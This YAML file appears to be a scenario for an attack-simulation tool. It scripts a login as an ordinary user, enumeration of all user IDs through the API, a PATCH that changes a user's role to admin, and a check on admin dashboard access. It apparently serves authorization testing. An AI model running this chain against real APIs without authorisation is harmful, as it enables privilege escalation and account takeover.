id: sim-credential-escalation
name: "Credential-Based API Enumeration & Privilege Escalation"
mode: predator
retry_on_failure: true

steps:
  - phase: access
    description: Authenticate as a standard user to obtain JWT token
    action:
      method: POST
      path: /api/v1/auth/login
      headers:
        Content-Type: "application/json"
      payload:
        username: "user@example.com"
        password: "Password123!"
    validate:
      status_code: 200
    extract:
      path: $.token
      save_as: auth_token

  - phase: reconnaissance
    description: Enumerate all user IDs via API using obtained token
    action:
      method: GET
      path: /api/v1/users
      headers:
        Authorization: "Bearer {{auth_token}}"
    validate:
      status_code: 200
    extract:
      path: $.data.users[*].id
      save_as: user_ids

  - phase: exploitation
    description: Attempt to escalate privileges by changing the role of the first user to admin
    action:
      method: PATCH
      path: /api/v1/users/{{user_ids[0]}}/role
      headers:
        Authorization: "Bearer {{auth_token}}"
        Content-Type: "application/json"
      payload:
        role: "admin"
    validate:
      status_code: 200

  - phase: actions_on_objectives
    description: Verify elevated access by accessing the admin dashboard
    action:
      method: GET
      path: /api/v1/admin/dashboard
      headers:
        Authorization: "Bearer {{auth_token}}"
    validate:
      status_code: 200
      contains: "adminDashboard"